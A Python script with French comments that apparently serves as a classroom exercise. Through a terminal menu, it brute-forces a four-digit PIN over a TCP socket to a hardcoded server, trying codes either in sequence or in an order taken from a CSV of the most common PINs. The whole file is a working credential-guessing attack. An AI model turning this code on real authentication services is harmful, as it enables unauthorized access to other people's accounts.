import sys, socket, csv
from simple_term_menu import TerminalMenu
import time

def await_input() -> None:
    """
    Fonction permettant d'attendre une saisie utilisateur pour continuer
    :return: None
    """

    input("Appuyez sur Entrée pour continuer...")


def find_pin_without_optimisation(ma_socket: socket.socket):
    """
    Fonction permettant de se connecter au site internet en testant tout les codes pin possibles
    :param ma_socket: Socket utilisateur permettant de se connecter au site internet
    :return:
    """
    timer_start = time.time()
    pin_use = 0
    pin_found = False
    print('Recherche du code pin...')

    for pin in range(1000):
        print(pin)
        ma_socket.sendall(bytes(str(pin).zfill(4), 'utf-8'))
        ligne = str(ma_socket.recv(1024))
        if not ligne == "b'Incorrect PIN\\n'":
            pin_found = True
            pin_use = pin
            break

    if not pin_found:
        for pin in range(1000, 10000):
            print(pin)
            ma_socket.sendall(bytes(str(pin), 'utf-8'))
            ligne = str(ma_socket.recv(1024))
            if not ligne == "b'Incorrect PIN\\n'":
                pin_use = pin
                pin_found = True
                break

    if not pin_found:
        print("PIN NOT FOUND (how ???)")
    else:
        print(f"PIN FOUND : {pin_use}")
        timer_end = time.time()
        print(f"Temps d'exécution : {round(timer_end - timer_start, 2)} secondes")


def find_pin_with_a_sort(ma_socket: socket.socket):
    """
    Fonction permettant de se connecter au site internet en testant tout les codes pin possibles dans un ordre précis
    grâce à un fichier csv
    :param ma_socket: Socket utilisateur permettant de se connecter au site internet
    :return:
    """
    timer_start = time.time()
    pin_use = 0
    pin_found = False

    with open('four-digit-pin-codes-sorted-by-frequency-withcount.csv', newline='') as csvfile:
        print('Recherche du code pin...')
        spamreader = csv.reader(csvfile, delimiter=',')
        for pin, _ in spamreader:
            ma_socket.sendall(bytes(pin, 'utf-8'))
            ligne = str(ma_socket.recv(1024))
            if not ligne == "b'Incorrect PIN\\n'":
                pin_use = pin
                pin_found = True
                break

        if not pin_found:
            print("PIN NOT FOUND (how ???)")
        else:
            print(f"PIN FOUND : {pin_use}")
            timer_end = time.time()
            print(f"Temps d'exécution : {round(timer_end - timer_start, 2)} secondes")



if __name__ == "__main__":
    main_title = "Authentification à un site\nAppuyez sur les flèches pour naviguer et sur Entrée pour sélectionner"
    main_options = ["Méthode sans trier les codes possibles", "Méthode avec un tri sur les codes possibles", None, "Quitter"]
    main_menu = TerminalMenu(main_options, title=main_title, cycle_cursor=True, clear_screen=True)
    server = "51.195.253.124"
    port = 12345
    mode = 1

    ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        ma_socket.connect((server, port))
    except Exception as e:
        print("Problème de connexion", e.args)
        sys.exit(1)

    ligne = ma_socket.recv(1024)
    print(ligne)

    while True:
        main_entry_index = main_menu.show()
        if main_entry_index == 0:
            find_pin_without_optimisation(ma_socket)
            await_input()
        elif main_entry_index == 1:
            find_pin_with_a_sort(ma_socket)
            await_input()
        elif main_entry_index == len(main_options) - 1 or main_entry_index is None:
            print("Au revoir !")
            exit(0)